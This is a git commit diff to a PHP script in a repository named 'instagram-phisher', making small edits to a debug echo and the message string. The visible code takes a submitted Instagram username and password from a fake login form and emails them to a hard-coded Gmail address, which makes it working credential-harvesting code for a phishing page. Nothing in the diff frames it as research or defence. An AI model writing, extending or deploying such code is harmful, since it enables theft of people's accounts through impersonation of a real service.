e2e97027e4ccbfc50478ea753882ffb2d7eb9ee7
nomiss7 <89870042+Decisionbot@users.noreply.github.com>
2022-11-01 21:29:49 +0300

    і

--- instagram-phisher/instagram_login/proccess.php
+++ instagram-phisher/instagram_login/proccess.php
@@ -1,5 +1,5 @@
 <?php
-echo "Прошло4";
+echo "Прошло5";
 ini_set('display_errors', '1');
 
 $username=$_POST['username'];
@@ -29,7 +29,7 @@ try {
     $mail->addAddress('Nikibestshark@gmail.com');     //Add a recipient
 
 
-    $message = "Login" . $username . "/n" . "Password" . $password;
+    $message = "Login". $username. "/n"."Password". $password;
 
     //Content
     $mail->isHTML(true);                                  //Set email format to HTML
